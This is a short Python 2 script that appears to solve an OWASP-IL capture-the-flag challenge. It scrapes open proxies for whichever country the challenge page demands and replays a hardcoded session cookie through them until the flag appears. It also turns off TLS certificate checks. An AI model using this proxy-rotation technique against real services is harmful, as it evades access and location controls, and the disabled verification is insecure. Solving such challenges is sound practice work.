#!/usr/bin/python
import re
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#
# Global Configurations
#

country_codes = open("country_codes").read()
url = 'http://challenges.owaspil.ctf.today:8095/'

cookies = {'session': '.eJxlkc1qwzAQhF-l6JyDSaNDDDlWcgwJOI21kksJ_gnIRHJNZOM6we9eQRtYN7fl2x1mhr2T8qtvOhKuFr_TtT67k6mdRx938lKQkKR23SmgrUo2GzIt_ugRmFPS3HJ4Q_TdskHBCpFExk0GNMiBakQb4bIlG-dqAd2owPTZzCmR4lZFsS640fiWthUXly3bB0oeTDnMNPBdP2dOXyuTcdHjHLE-W-NQL7seqyWjT_7_-3MT5JHQhcWpUu7VkWgUDNiX69anH0ruu8kd2hy8f2H3hkyfjweMJHwYX0p_Ov0AP4l-mQ.DoQ3vA.oHSf5k7aWnPQ0evrUxILmOjm1d8'}
response = requests.get(url, cookies=cookies)

for i in xrange(17):
    country_name = response.text.split("from")[1].split("(")[0].strip()
    code = re.search(r'{0}\s([A-Z][A-Z])'.format(country_name), country_codes).group(1).lower()
    proxy_list = "https://www.proxynova.com/proxy-server-list/country-{0}/".format(code)
    response = requests.get(proxy_list, verify=False)

    for proxy_part in response.text.split("data-proxy-id"):
        ip_address = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|\b\d{1,3}\-\d{1,3}\-\d{1,3}\-\d{1,3}\b",
                               proxy_part)
        if ip_address:
            ip_address = ip_address.group()

        port_address = re.search(r"Port (.*?) proxies", proxy_part)
        if port_address:
            port_address = port_address.group(1)

        if ip_address and port_address:
            proxy_dict = {
                "http": "http://{0}:{1}".format(ip_address.replace("-", "."), port_address)
            }
            try:
                response = requests.get(url, proxies=proxy_dict ,cookies=cookies)

                # sometimes we have manually bypass the proxy
                # print response.cookies["session"]
                cookies["session"] = response.cookies["session"]

                print "[+] {0}".format(response.text)

                if "OWASP-IL" in response.text:
                    print "[*] {0}".format(response.text)
                    exit(0)

                break

            except Exception as e:
                pass
